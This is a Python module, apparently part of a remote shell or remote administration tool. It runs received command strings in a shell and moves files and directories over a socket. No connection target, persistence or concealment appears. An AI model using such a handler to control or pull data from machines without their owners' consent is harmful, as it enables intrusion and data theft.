#!/usr/bin/env python3


import os 
import socket
from subprocess import Popen, run
from handle_files import UploadFile, DownloadFile, UploadDownloadDirectory


class Execute:
    def _execute_local(self, command: str) -> bytes:
        output = run(command, capture_output=True, shell=True).stdout
        return output
    
    def execute(self, command: str) -> bytes:
        try:
            output = self._execute_local(command)
        except Exception as ex:
            output = f"Unable to execute the command due to --> {ex}".encode("utf-8")
        return output

    def chdir(self, args: (list | None)) -> bytes:
        output = "No PATH provided.".encode("utf-8")
        if args is not None:
            path = args[0]
            try:
                os.chdir(path)
                output = os.getcwd().encode("utf-8")
            except Exception as ex:
                output = f"Unable to change working directory due to --> {ex}".encode("utf-8")
        return output

    def download(self, sock: socket.socket) -> bytes:
        file = DownloadFile(sock)
        output = file.download_file()
        return output

    def upload(self, sock: socket.socket) -> bytes:
        file = UploadFile(sock)
        output = file.upload_file()
        return output
    
    def download_dir(self, sock: socket.socket) -> bytes:
        directory = UploadDownloadDirectory(sock)
        output = directory.download_directory()
        return output

    def upload_dir(self, sock: socket.socket) -> bytes:
        directory = UploadDownloadDirectory(sock)
        output = directory.upload_directory()
        return output